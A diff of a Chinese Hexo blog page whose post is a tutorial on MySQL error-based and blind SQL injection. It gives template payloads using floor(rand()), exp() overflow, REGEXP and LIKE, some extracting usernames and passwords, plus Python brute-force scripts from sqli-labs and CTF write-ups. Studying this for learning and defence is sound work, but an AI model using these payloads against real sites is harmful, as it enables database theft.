@@ -14,10 +14,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>再探SQL报错注入 | hybcx&#39;s blog</title>
@@ -263,7 +273,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -320,7 +330,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -419,11 +429,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -462,21 +467,21 @@ rand（）：生成一个0-1之间的随机数，不包括0和1
 count（*）：统计某个表下面一共有多少记录
 group by XXX：按照一定的规则对XXX进行排序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>报错原理：group by和rand（）联合使用的时候，如果临时表中没有该主键，则再插入的之前会再计算一次rand（），然后再由group by将计算出来的主键直接插入到临时表格之中，导致主键重复，然后报错。<br>
-<img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210526397.png" alt="image-20231214210526397"></p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210545841.png" alt="image-20231214210545841"></p>
+<img src="image-20231214210526397.png" alt="image-20231214210526397"></p>
+<p><img src="image-20231214210545841.png" alt="image-20231214210545841"></p>
 <p>上述是这些函数的简单用法，以下不想费劲搭环境了，直接照搬师傅的了。。。</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231214210918104.png" alt="image-20231214210918104"></p>
+<p><img src="image-20231214210918104.png" alt="image-20231214210918104"></p>
 <p>在这里使用group by的时候回生成一张临时表，也叫做虚拟表，而且表都是有主键的，作为主键的列是不能由重复的，好比第一个值的主键为1，那么就不能再有主键为1的值了，接下来可以再是2、3…</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215163639852.png" alt="image-20231215163639852"></p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215163654153.png" alt="image-20231215163654153"></p>
+<p><img src="image-20231215163639852.png" alt="image-20231215163639852"></p>
+<p><img src="image-20231215163654153.png" alt="image-20231215163654153"></p>
 <p>可以看到上述两幅图片中第二幅图片的序列明显更规律（也就是伪序列）</p>
 <p>首先这是一个虚拟表，自然就有主键。当使用group by去读这些数据的时候，好比上面这个伪随机序列，读完第一列，发现主键之中没有0这个数字，但由于rand的存在，他不会立刻插入，而是会继续运算一次rand函数，然后经过floor之后0变成了1，随后率先插入的数字便成了1。然后取第二条数据，此时floor之后为数字1，但该虚拟表中已经有了1，则该数字1对应的值自增1，继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，由于表中不存在数字0，则继续rand一次，经过floor之后成了1，但根据特性，该数字1会硬插入该虚拟表中，导致了数字1的重复，最终报错</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215163957161.png" alt="image-20231215163957161"></p>
+<p><img src="image-20231215163957161.png" alt="image-20231215163957161"></p>
 <p>这里是个例子，将user（）的位置换做别的，就可以显示出别的错误了。<br>
 爆库：</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215164013653.png" alt="image-20231215164013653"></p>
+<p><img src="image-20231215164013653.png" alt="image-20231215164013653"></p>
 <p>可以看到使用的security，后面的数字1是rand（）函数产生的。</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215164151961.png" alt="image-20231215164151961"></p>
+<p><img src="image-20231215164151961.png" alt="image-20231215164151961"></p>
 <p>这里可以看到具体信息了。其实就是利用了count的统计与group by的合作，然后基于主键唯一的机制，然后造成了这个错误。</p>
 <p>模板payload大致如下：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token punctuation">)</span>b<span class="token punctuation">;</span>  <span class="token comment">#第一种</span>
@@ -489,7 +494,7 @@ group by XXX：按照一定的规则对XXX进行排序<span aria-hidden="true" c
 
 uname=hybcx&amp;passwd=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token comment">#&amp;submit=Submit   #第三种</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>只需将上面模板中的内容替换成为我们的查询payload即可，a与b均是字段别名</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165205920.png" alt="image-20231215165205920"></p>
+<p><img src="image-20231215165205920.png" alt="image-20231215165205920"></p>
 <h1>0x03 EXP函数报错注入</h1>
 <ul>
 <li>作用：计算以e为底的幂值</li>
@@ -497,16 +502,16 @@ uname=hybcx&amp;passwd=1'</span> <span class="token keyword">union</span> <span 
 <li>报错原理：当参数X超过了710之后，exp函数就会报错。</li>
 </ul>
 <p>MySQL中的EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 …)是自然对数的底数。</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165453272.png" alt="image-20231215165453272"></p>
+<p><img src="image-20231215165453272.png" alt="image-20231215165453272"></p>
 <p>该函数可以用来进行 MySQL 报错注入。但是为什么会报错呢？我们知道，次方到后边每增加 1，其结果都将跨度极大，而 MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误：</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165519117.png" alt="image-20231215165519117"></p>
+<p><img src="image-20231215165519117.png" alt="image-20231215165519117"></p>
 <p>除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。</p>
 <ul>
 <li>使用版本：MySQL5.5.5 及以上版本</li>
 </ul>
 <p>现在我们已经知道当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误。那么我们在实际利用中如何让 exp() 报错的同时返回我们想要得到的数据呢？</p>
 <p>我们可以用 <code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出：</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215165845068.png" alt="image-20231215165845068"></p>
+<p><img src="image-20231215165845068.png" alt="image-20231215165845068"></p>
 <p>如上图所示，成功报错并输出了数据。但是事实证明，在 MySQL&gt;=5.5.53 之后，exp() 报错不能返回我们的查询结果，而只会得到一个报错：</p>
 <p>下面由于实操的时候在安装MySQL低版本总是报错，我就直接照搬了（见谅~）</p>
 <h2 id="注出数据">注出数据</h2>
@@ -597,7 +602,7 @@ ERROR 1690 (22003): DOUBLE value is out of range in '</span>exp<span class="toke
 <p>有的登录逻辑会根据 sql 语句的报错与否返回不同的结果，如果我们可以控制这里得报错的话便可以进行盲注。下面我们通过一个 CTF 例题来进行详细探究。</p>
 <h3 id="2021-虎符杯-CTF-Finalweb-Hatenum">2021 虎符杯 CTF Finalweb Hatenum</h3>
 <p>进入题目是一个登录页面：（对我来说有点难度，只能基本抄wp了）</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215173228030.png" alt="image-20231215173228030"></p>
+<p><img src="image-20231215173228030.png" alt="image-20231215173228030"></p>
 <p>我们先分析一波题目给的源码</p>
 <p>home.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -696,7 +701,7 @@ ERROR 1690 (22003): DOUBLE value is out of range in '</span>exp<span class="toke
 	<span class="token punctuation">}</span>
 <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>那我们重点关注一下sql语句部分</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215174048617.png" alt="image-20231215174048617"></p>
+<p><img src="image-20231215174048617.png" alt="image-20231215174048617"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里似乎可以构造万能密码，payload似乎与我之前刷的靶场思路一致</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>\
@@ -853,7 +858,7 @@ payload <span class="token operator">=</span> <span class="token string">'||exp(
 <pre class="line-numbers language-none"><code class="language-none">erghruigh2uygh23uiu32ig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>不过这里我也是想不通最后这个死循环的解决原理。。。</p>
 <p>然后直接登陆即可得到 flag：</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215200129931.png" alt="image-20231215200129931"></p>
+<p><img src="image-20231215200129931.png" alt="image-20231215200129931"></p>
 <p>接着我又找了几篇wp发现有位师傅直接从最后一个字符开始匹配，用到了$正则：</p>
 <pre class="line-numbers language-none"><code class="language-none">$ 是一个用于锚定模式结尾位置的元字符，用于确保匹配发生在输入字符串的末尾。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这样就不会有上述重复的问题，但是也要配合从第一位开始爆破的脚本，这样两者对比才可正确得出</p>
@@ -896,7 +901,7 @@ tmp <span class="token operator">=</span> <span class="token string">'$'</span>
                 <span class="token keyword">else</span><span class="token punctuation">:</span>
                     tmp <span class="token operator">=</span> j <span class="token operator">+</span> tmp
                 <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215200406827.png" alt="image-20231215200406827"></p>
+<p><img src="image-20231215200406827.png" alt="image-20231215200406827"></p>
 <p>如上图，最后简单反转一下字符串即可</p>
 <p>最后会有如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">erghruigh2uygh2uygh2uygh2uygh2
@@ -1034,8 +1039,8 @@ mysql<span class="token operator">&gt;</span> <span class="token keyword">select
 <span class="token operator">regexp</span> <span class="token string">'^r[a-z]'</span> <span class="token comment">#判断一个表的第二个字符串是否在a-z中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>（3）在联合查询中的使用</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'^s'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215205452658.png" alt="image-20231215205452658"></p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215205541822.png" alt="image-20231215205541822"></p>
+<p><img src="image-20231215205452658.png" alt="image-20231215205452658"></p>
+<p><img src="image-20231215205541822.png" alt="image-20231215205541822"></p>
 <p>上述password处只会显示1或者0，这样就能知道我们的regexp是否匹配成功。</p>
 <h3 id="2、REGEXP盲注">2、REGEXP盲注</h3>
 <p>在sqli-labs靶场Less-8关进行测试</p>
@@ -1086,7 +1091,7 @@ payload <span class="token operator">=</span> database1
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'_____'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>5.<code>like 's____'</code> 判断第一个字符是否为s</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'s____'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210444287.png" alt="image-20231215210444287"></p>
+<p><img src="image-20231215210444287.png" alt="image-20231215210444287"></p>
 <h3 id="2、LIKE盲注">2、LIKE盲注</h3>
 <p>依旧在sqli-labs靶场Less-8关进行测试</p>
 <p><strong>1.判断数据库长度</strong><br>
@@ -1096,8 +1101,8 @@ payload <span class="token operator">=</span> database1
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' or database() like '</span>s<span class="token operator">%</span><span class="token string">'--+
 也可用
 '</span> <span class="token operator">or</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'s_______'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210703023.png" alt="image-20231215210703023"></p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210719431.png" alt="image-20231215210719431"></p>
+<p><img src="image-20231215210703023.png" alt="image-20231215210703023"></p>
+<p><img src="image-20231215210719431.png" alt="image-20231215210719431"></p>
 <p>说明数据库名的第一个字符是s。数据表、字段、数据类似，把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> string
@@ -1126,12 +1131,12 @@ payload <span class="token operator">=</span> database1
                 <span class="token keyword">break</span>
         <span class="token keyword">if</span> <span class="token keyword">char</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token string">'#'</span>:
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215210857723.png" alt="image-20231215210857723"></p>
+<p><img src="image-20231215210857723.png" alt="image-20231215210857723"></p>
 <h3 id="3、REGEXP注入实战">3、REGEXP注入实战</h3>
 <h4 id="BJDCTF-2nd-简单注入">BJDCTF 2nd 简单注入</h4>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215213109014.png" alt="image-20231215213109014"></p>
+<p><img src="image-20231215213109014.png" alt="image-20231215213109014"></p>
 <p>发现提示</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215213135245.png" alt="image-20231215213135245"></p>
+<p><img src="image-20231215213135245.png" alt="image-20231215213135245"></p>
 <p>这里给出了sql语句</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Only u input the correct password <span class="token keyword">then</span> u can get the flag
 <span class="token operator">and</span> p3rh4ps wants a girl friend<span class="token punctuation">.</span>
@@ -1145,10 +1150,10 @@ password<span class="token operator">=</span><span class="token string">'or 1#'<
 <p>简单fuzz一下看一下过滤情况：</p>
 <pre class="line-numbers language-none"><code class="language-none">过滤的有：select、union、'、=、like等等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>但是没过滤regexp</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215213832727.png" alt="image-20231215213832727"></p>
+<p><img src="image-20231215213832727.png" alt="image-20231215213832727"></p>
 <p>如上图发现页面有变化，接下来进一步测试</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215214058299.png" alt="image-20231215214058299"></p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215214043397.png" alt="image-20231215214043397"></p>
+<p><img src="image-20231215214058299.png" alt="image-20231215214058299"></p>
+<p><img src="image-20231215214043397.png" alt="image-20231215214043397"></p>
 <p>发现页面回显不一致，但始终只有这两条信息，这意味着我们需要进行盲注了，直接上脚本，这里我先尝试自己写一番</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> string
@@ -1183,9 +1188,9 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
                 name <span class="token operator">+=</span> j
                 <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                 <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215215446707.png" alt="image-20231215215446707"></p>
+<p><img src="image-20231215215446707.png" alt="image-20231215215446707"></p>
 <p>成功得到密码，我们登录即可得到flag</p>
-<p><img src="/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/image-20231215215519726.png" alt="image-20231215215519726"></p>
+<p><img src="image-20231215215519726.png" alt="image-20231215215519726"></p>
 <h1>0x05 后言</h1>
 <p>本次对于报错注入的学习有些许深刻，日后会随缘更新补充本文，希望可以对报错注入有一个完全的掌握。</p>
 <h1>0x06 参考文章</h1>
@@ -1289,7 +1294,7 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -1297,7 +1302,7 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -1577,12 +1582,12 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1727,6 +1732,8 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1754,8 +1761,8 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1838,8 +1845,6 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1859,24 +1864,28 @@ headers <span class="token operator">=</span> <span class="token punctuation">{<
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -2088,8 +2097,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
